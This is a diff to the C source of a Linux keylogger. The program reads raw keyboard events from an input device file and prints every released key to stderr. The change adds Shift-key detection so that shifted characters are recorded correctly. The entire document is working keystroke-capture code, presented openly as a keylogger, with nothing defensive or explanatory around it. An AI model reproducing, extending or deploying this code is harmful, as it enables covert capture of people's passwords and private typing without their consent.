@@ -7,6 +7,14 @@
 #include "keylogger.h"
 
 /*
+ *Check if the pressed key is Shift or not 
+ * 
+ */
+int isShift(unsigned int key_code) {
+    return key_code == KEY_LEFTSHIFT || key_code == KEY_RIGHTSHIFT;
+}
+
+/*
  * Information regarding all devices in use is displayed by /proc/bus/input/devices
  * Keyborad device file has EV == 120013
  * 'grep -B1' starts printing from one line before the macthing line
@@ -60,18 +68,26 @@ int main(int argc, char *argv[]) {
 
     /*Get keys pressed by the user*/
     while(1) {
-       
         read(fd, &input_ev, sizeof(struct input_event));
-        
-        /*input_event.type specifies the input type/method which is key in our case
-         * input_event.value == 0 specifies key_release
-        */
-        if((input_ev.type == EV_KEY) && (input_ev.value == 0)) {
-            fprintf(stderr, "%s\n", key_map[input_ev.code][0]);
-        }
-    
+
+
+    if(isShift(input_ev.code)){
+        shift_check = 1;
+        continue;
     }
 
+    /*input_event.type specifies the input type/method which is key in our case
+        * input_event.value == 0 specifies key_release
+    */
+    if((input_ev.type == EV_KEY) && (input_ev.value == 0)) {
+        if(!shift_check)
+            fprintf(stderr, "%s\n", key_map[input_ev.code][0]);
+        else {
+            fprintf(stderr, "%s\n", key_map[input_ev.code][1]);
+            shift_check = 0;
+        }
+    }
+}
     close(fd);
     return 0;
 }
